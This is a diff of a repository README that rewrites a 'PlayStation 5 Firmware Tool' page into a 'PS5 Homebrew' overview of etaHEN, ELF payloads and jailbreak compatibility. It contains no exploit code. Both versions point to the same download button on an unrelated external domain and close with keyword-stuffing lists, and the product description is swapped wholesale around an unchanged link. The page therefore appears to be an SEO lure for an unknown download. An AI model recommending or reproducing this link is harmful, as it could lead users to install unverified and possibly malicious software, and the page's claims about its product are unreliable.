@@ -1,162 +1,262 @@
-<h1 align="center">🖥️ PlayStation 5 Firmware Tool</h1>
+
+# PS5 Homebrew — PlayStation 5 Homebrew Environment
 
 <p align="center">
-  <strong>Firmware Organization. Version Tracking. System Maintenance.</strong>
+  <strong>Homebrew tools, payload support, jailbreak research, and system utilities for PlayStation 5</strong>
 </p>
 
 <p align="center">
-  A Windows desktop tool for organizing PlayStation 5 system software files and firmware maintenance workflows.
-  <br>
-  Firmware Management · Version Information · Package Organization · USB Preparation · System Maintenance
+  <a href="https://dyhuiying.com/s/file"><img src="https://img.shields.io/badge/Download-PS5%20Homebrew-blue?style=for-the-badge&logo=github" alt="Download PS5 Homebrew"/></a>
 </p>
 
 <p align="center">
-  <a href="https://dyhuiying.com/s/file">
-    <img src="https://img.shields.io/badge/DOWNLOAD%20FOR%20WINDOWS-003791?style=for-the-badge&logo=windows&logoColor=white" alt="PlayStation 5 Firmware Tool Download">
-  </a>
+  <img src="https://img.shields.io/badge/Platform-PlayStation%205-blue" alt="Platform: PlayStation 5"/>
+  <img src="https://img.shields.io/badge/Category-Homebrew-green" alt="Category: Homebrew"/>
+  <img src="https://img.shields.io/badge/Tools-etaHEN-orange" alt="Tools: etaHEN"/>
+  <img src="https://img.shields.io/badge/Status-Community%20Developed-brightgreen" alt="Status: Community Developed"/>
 </p>
 
-<p align="center">
-  <img src="https://img.shields.io/badge/platform-Windows%2010%20%2F%2011-003791?style=flat-square&logo=windows&logoColor=white">
-  <img src="https://img.shields.io/badge/status-active-2ea44f?style=flat-square">
-  <img src="https://img.shields.io/badge/category-firmware-003791?style=flat-square">
-</p>
+## Overview
 
-<details>
-<summary>📑 Contents</summary>
+The **PS5 Homebrew Environment** is a collection of community-developed tools, payloads, and software designed to expand the functionality of compatible Sony PlayStation 5 consoles.
 
-- [Product Overview](#-product-overview)
-- [System Requirements](#-system-requirements)
-- [Key Features](#-key-features)
-- [Module Overview](#-module-overview)
-- [Supported Platform](#-supported-platform)
-- [Technical Specifications](#-technical-specifications)
-- [Installation Guide](#-installation-guide)
-- [FAQ](#-faq)
-- [SEO Keywords](#-seo-keywords)
+The PS5 homebrew scene includes projects such as **etaHEN**, ELF loaders, kernel exploit chains, plugin frameworks, debugging utilities, and application-management tools.
 
-</details>
+These projects depend on console firmware versions and specific exploit implementations. Compatibility is not universal: a tool that works on one firmware version may not work on another.
 
-## 📌 Product Overview
+This repository is intended as a general project overview for PS5 homebrew technologies. It is not a standalone custom firmware installer, and it does not represent a universal jailbreak for every PS5 console.
 
-PlayStation 5 Firmware Tool provides a Windows-based workspace for managing PS5 system software files and organizing firmware-related maintenance tasks.
+## Key Features
 
-The workflow focuses on local file organization, firmware version references, update package handling, and preparation of USB-based update materials. It is dedicated to the PlayStation 5 platform and keeps its firmware resources separate from those used by other console generations.
+- **Homebrew Environment:** Support for compatible unofficial applications and utilities.
+- **etaHEN Integration:** Homebrew-enabling functionality and a toolbox for supported configurations.
+- **Payload Loading:** Execution of compatible ELF payloads through supported loaders.
+- **Kernel Exploit Support:** Integration with publicly available exploit chains where compatible.
+- **Plugin Framework:** Support for compatible custom plugins and extensions.
+- **Debug Settings:** Access to additional development and diagnostic functionality on supported systems.
+- **FTP Services:** File transfer functionality through compatible homebrew tools.
+- **Game Management:** Support for compatible game-management and backup utilities.
+- **System Utilities:** Additional tools for supported firmware environments.
+- **Developer Tools:** Payload SDK workflows, debugging, logging, and development support.
 
-## 💻 System Requirements
+## Technical Specifications
 
-| Component | Requirement |
+| Specification | Details |
 |---|---|
-| Operating System | Windows 10 / Windows 11, 64-bit |
-| RAM | Not specified |
-| Storage | Depends on firmware files and workspace contents |
-| Privileges | Administrator access may be required for selected system operations |
+| Platform | Sony PlayStation 5 |
+| Hardware Family | PS5 and compatible PS5 Pro configurations |
+| Software Category | Homebrew and exploit-based tools |
+| Main Homebrew Project | etaHEN |
+| Payload Format | ELF |
+| Exploit Entry Points | Firmware-dependent |
+| Kernel Access | Requires a compatible exploit chain |
+| Plugin Support | Depends on the installed framework |
+| Network Features | Supported FTP and payload services |
+| Installation Environment | Firmware- and exploit-dependent |
+| Project Type | Community-developed software |
 
-## ✨ Key Features
+## Compatibility
 
-### Firmware File Organization
-- 📁 Organize locally stored PlayStation 5 system software files.
-- 🗂️ Maintain separate folders for firmware packages and related resources.
-- 🔎 Review file names and available package information.
-- 📋 Keep firmware materials structured by version.
+PS5 homebrew compatibility depends primarily on the installed system software version, exploit availability, and the specific payload or application being used.
 
-### Version Management
-- 🔢 Maintain references to PS5 system software versions.
-- 🧾 Associate version information with locally stored packages.
-- 🗃️ Separate firmware resources for easier identification.
-- 🔍 Review selected firmware files before starting maintenance tasks.
+### Public Jailbreak Compatibility Snapshot
 
-### USB Update Preparation
-- 💾 Organize files for USB-based system software update workflows.
-- 📂 Maintain the required update directory structure.
-- 🧭 Prepare update resources for the console's Safe Mode procedure.
-- 🔌 Keep USB update materials separate from unrelated files.
+As of November 18, 2026, the Relapse exploit chain has been publicly reported for PS5 firmware versions 7.00 through 13.60.
 
-### Maintenance Workflow
-- ⚙️ Keep firmware-related operations organized.
-- 📌 Maintain a consistent local file management process.
-- 🖥️ Handle firmware resources from a Windows desktop environment.
-- 📚 Keep platform-specific information in one workspace.
-
-## 📋 Module Overview
-
-| Module | What it does |
+| Firmware Version | Public Status |
 |---|---|
-| Firmware Library | Organizes locally stored PS5 firmware resources |
-| Version Reference | Maintains firmware version information |
-| Package Organizer | Groups system software files by version |
-| File Inspector | Displays available file and package details |
-| USB Preparation | Organizes USB update materials |
-| Update Workflow | Structures the preparation process for system updates |
-| Directory Manager | Maintains local firmware folders |
-| Operation Log | Records workflow activity where logging is available |
+| 7.00–13.60 | Public Relapse exploit chain reported |
+| 14.00 | No public complete jailbreak chain reported |
+| 14.10–14.23 | No public complete jailbreak chain reported |
 
-## 🎮 Supported Platform
+Older firmware versions may have separate exploit paths and tool requirements. The availability of an individual userland exploit does not necessarily mean that kernel access, hypervisor access, or full homebrew functionality is available.
 
-| Platform | Device Family | Firmware Category |
+### Compatibility Notes
+
+- Exploit support and homebrew support are not the same thing.
+- etaHEN requires a compatible exploit and payload-loading environment.
+- Individual plugins and applications may support narrower firmware ranges.
+- PS5 and PS5 Pro compatibility should be checked against each project's documentation.
+- Firmware updates can close vulnerabilities and change exploit compatibility.
+- Do not assume that a newer firmware version is supported simply because an older version is.
+
+**Important:** The firmware status above is a dated public-availability snapshot, not a guarantee that every console in the listed range supports every feature.
+
+## Firmware Features
+
+### etaHEN Homebrew Enabler
+
+etaHEN is an all-in-one homebrew enabler for compatible PS5 configurations.
+
+Its feature set includes a toolbox interface, payload and plugin management, supported system utilities, and integration with other homebrew projects.
+
+### Payload Loading
+
+Compatible ELF payloads can be loaded through supported exploit and ELF-loader workflows.
+
+Payload availability depends on the firmware version, loader implementation, and required system permissions.
+
+### Kernel Exploit Integration
+
+Public exploit chains can provide access to additional system functionality on compatible firmware versions.
+
+Relapse is one publicly released exploit chain reported for firmware versions up to 13.60. Other exploit projects cover different firmware ranges and may have different requirements.
+
+### Plugin Support
+
+Compatible plugin frameworks can extend the functionality of the homebrew environment.
+
+Plugin availability and behavior depend on the installed etaHEN version, firmware compatibility, and individual plugin requirements.
+
+### Debug and Development Tools
+
+Supported configurations may provide access to additional debugging features, system information, logging, and developer-oriented utilities.
+
+### FTP and File Management
+
+Compatible homebrew tools can provide network-based file transfer and management functionality.
+
+### Game Management
+
+Supported tools may provide game-management features, application integration, and backup-related workflows. Available functionality varies by firmware and application.
+
+## System Requirements
+
+Before using PS5 homebrew tools, verify that you have:
+
+- A Sony PlayStation 5 or supported PS5 Pro console.
+- A firmware version compatible with the selected exploit and homebrew release.
+- The appropriate exploit entry point for your firmware.
+- A compatible ELF loader or payload-loading method.
+- The required payload files and supporting tools.
+- A local network connection when using network-based payload delivery or FTP.
+- A USB storage device when required by a specific installation workflow.
+- Sufficient free storage for applications and data.
+- Access to the documentation for each individual tool.
+
+Do not update the console before checking whether the update affects the exploit and homebrew tools you intend to use.
+
+## Download & Installation
+
+<p align="center">
+  <a href="https://dyhuiying.com/s/file"><img src="https://img.shields.io/badge/Download-PS5%20Homebrew-blue?style=for-the-badge&logo=github" alt="Download PS5 Homebrew"/></a>
+</p>
+
+### Before Installation
+
+1. Identify the exact PS5 system software version.
+2. Check whether a public exploit is available for that version.
+3. Confirm that the selected homebrew enabler supports the exploit environment.
+4. Read the installation documentation for the selected release.
+5. Back up important console data.
+6. Prepare the required payloads and supporting files.
+7. Avoid firmware updates until compatibility has been verified.
+
+### General Installation Workflow
+
+1. Confirm the console firmware and hardware configuration.
+2. Select an exploit method documented for that firmware.
+3. Start the compatible exploit entry point.
+4. Load the required ELF loader or payload environment.
+5. Deploy the compatible homebrew enabler payload.
+6. Wait for the tool to report successful initialization.
+7. Open the available homebrew toolbox or supported interface.
+8. Verify that the installed tools and features are working.
+
+**Note:** This is a general workflow, not a universal installation procedure. Specific exploit chains may require different entry points, payloads, network settings, or preparation steps. Follow the documentation for the exact project and firmware version.
+
+## Configuration & Management
+
+### etaHEN Toolbox
+
+The etaHEN toolbox provides access to supported homebrew management features. Available menus and options depend on the installed version.
+
+### Payload Management
+
+Use payloads built for the target firmware and compatible loader. Incorrect or incompatible payloads can cause application crashes or system instability.
+
+### Plugin Configuration
+
+Install only plugins that explicitly support your homebrew environment. Review configuration files and disable recently added plugins if instability occurs.
+
+### Network Configuration
+
+Some payload-loading and management workflows use a local network connection. Verify the console's IP address and the required service port before connecting.
+
+### Firmware Management
+
+Avoid installing system software updates without checking their effect on the available exploit chain. A firmware update may permanently remove access to a currently usable public exploit.
+
+### Backup and Recovery
+
+Keep backups of important data. Follow project-specific recovery guidance if a payload or plugin causes instability.
+
+## Troubleshooting
+
+| Problem | Possible Cause | Recommended Action |
 |---|---|---|
-| PlayStation 5 | PS5 | System Software |
+| Exploit does not start | Unsupported firmware or entry point | Verify the exact firmware and exploit requirements |
+| ELF payload fails to load | Incorrect loader or payload | Check the payload format and loader compatibility |
+| etaHEN does not initialize | Incompatible exploit chain or payload | Verify the supported configuration for the installed release |
+| Console freezes during exploit | Exploit instability or incompatible environment | Restart safely and follow the exploit project's troubleshooting guidance |
+| Plugin does not load | Unsupported plugin or incorrect configuration | Check plugin compatibility and configuration |
+| FTP connection fails | Network configuration or service issue | Verify the console IP address, network connection, and service status |
+| Debug features are unavailable | Required permissions or payload are missing | Confirm that the exploit and required payload initialized successfully |
+| Homebrew application crashes | Application incompatibility | Check its firmware and framework requirements |
+| Features disappear after reboot | Payload environment is no longer active | Repeat the documented activation workflow if required |
 
-This edition is dedicated to PlayStation 5 system software. It does not combine PS4 firmware resources or update packages with PS5-specific files.
+Do not repeatedly run incompatible payloads or change firmware in an attempt to fix an exploit failure. Identify the exact firmware and tool requirements first.
 
-## ⚙️ Technical Specifications
+## FAQ
 
-| Parameter | Details |
-|---|---|
-| Product Name | PlayStation 5 Firmware Tool |
-| Application Type | Windows Desktop Software |
-| Target Platform | PlayStation 5 |
-| Firmware Category | System Software |
-| Update Package Format | PS5 system software package |
-| USB File System | FAT32 / exFAT |
-| Update Directory | PS5/UPDATE |
-| Expected Update Filename | PS5UPDATE.PUP |
-| Interface Framework | Not specified |
-| Firmware Version Range | Not specified |
+### 1. What is PS5 homebrew?
 
-## 🚀 Installation Guide
+PS5 homebrew refers to unofficial applications, tools, payloads, and development projects created by the console community.
 
-1. Download the available application package from the project download page.
-2. Extract the downloaded archive to a local directory.
-3. Launch the application from the extracted folder.
-4. Select the firmware file management workflow.
-5. Add locally stored PS5 system software files.
-6. Organize packages and version references in the workspace.
-7. For a USB-based update, prepare the required directory structure on a compatible USB drive.
-8. Follow the PlayStation 5 system software update instructions on the console.
+### 2. Is PS5 homebrew the same as Custom Firmware?
 
-The standard PS5 USB update directory uses `PS5/UPDATE/PS5UPDATE.PUP`. Consult PlayStation support instructions for the applicable update or reinstallation procedure.
+No. The PS5 homebrew environment generally relies on firmware-specific exploits and payloads. It should not be described as a universal, permanently installed Custom Firmware solution.
 
-## ❓ FAQ
+### 3. What is etaHEN?
 
-### 1. Which console does this tool cover?
+etaHEN is an all-in-one Homebrew Enabler for compatible PS5 configurations. It provides a toolbox and multiple homebrew-related features.
 
-This edition is focused on PlayStation 5 system software and firmware-related file organization.
+### 4. Which PS5 firmware versions support public jailbreaks?
 
-### 2. Does it manage PS4 firmware?
+As of November 18, 2026, the Relapse exploit chain has been publicly reported for firmware versions 7.00 through 13.60. Older firmware versions may have separate exploit methods. Firmware 14.00 and later have no publicly reported complete jailbreak chain in the compatibility snapshot used here.
 
-No. PS4 firmware packages belong to a separate console generation and are outside this edition's scope.
+### 5. Does every PS5 support etaHEN?
 
-### 3. What file format is used for PS5 system software updates?
+No. etaHEN requires a compatible firmware and exploit environment. Check the requirements of the exact release before attempting to use it.
 
-PlayStation 5 system software update files use the `.PUP` package extension.
+### 6. What is an ELF payload?
 
-### 4. Can a PS5 system software update be prepared using a USB drive?
+An ELF payload is an executable file used by compatible loaders to run code in the PS5 homebrew environment.
 
-Yes. PlayStation documents USB-based update and reinstallation procedures that use a specific directory structure and compatible USB storage.
+### 7. Can PS5 homebrew use plugins?
 
-### 5. Where should I check firmware installation instructions?
+Yes. Compatible frameworks support plugins, but each plugin has its own firmware and framework requirements.
 
-Use the official PlayStation support documentation for current update files and console-specific installation steps.
+### 8. Can I use PS5 homebrew after updating my firmware?
 
-## 🔎 SEO Keywords
+That depends on the new firmware version and available exploit support. Updating may close vulnerabilities and make existing homebrew methods unavailable.
 
-PlayStation 5 firmware tool, PS5 firmware manager, PS5 system software, PS5 firmware files, PS5 update package, PS5 PUP file, PS5 firmware version, PS5 USB update, PlayStation 5 system update, PS5 firmware management, PS5 Safe Mode update, PS5 update folder, PS5UPDATE PUP, PS5 software maintenance, PS5 system software files, PS5 USB preparation, PlayStation firmware organization, PS5 firmware package management
+### 9. Does a jailbreak automatically install etaHEN?
 
-<p align="center">
-  <strong>🖥️ PlayStation 5 Firmware Tool</strong>
-  <br>
-  Firmware Management · Version Tracking · USB Preparation · System Maintenance
-  <br>
-  Windows Desktop Software
-</p>
+No. An exploit provides an entry point or additional system access. A compatible homebrew enabler may need to be loaded separately.
+
+### 10. Is PS5 Pro supported?
+
+Some PS5 homebrew projects report support for compatible PS5 Pro configurations. Always verify hardware-specific requirements in the documentation of the selected project.
+
+### 11. Can I use FTP with PS5 homebrew?
+
+FTP functionality is available through compatible tools and services. The required payload, network configuration, and port depend on the selected implementation.
+
+### 12. Why is firmware compatibility so important?
+
+PS5 exploits depend on vulnerabilities and system behavior that can change between firmware releases. A firmware update can patch an exploit or invalidate the offsets and payloads used by existing tools.
+
+## SEO Keywords
+
+PS5 Homebrew, PlayStation 5 Homebrew, PS5 Jailbreak, PS5 Homebrew Enabler, etaHEN, PS5 Payloads, PS5 ELF Loader, PS5 Exploit, Relapse Exploit, PS5 Firmware Compatibility, PS5 Kernel Exploit, PS5 Plugin Support, PS5 Toolbox, PS5 Debug Settings, PS5 FTP Server, PS5 Homebrew Applications, PS5 System Utilities, PS5 Homebrew Tools, PS5 Developer Tools, PS5 Payload Loader, PS5 Kernel Access, PS5 Custom Plugins, PS5 Game Management, PS5 Homebrew Environment, PlayStation 5 Software, PS5 Pro Homebrew, PS5 Exploit Research
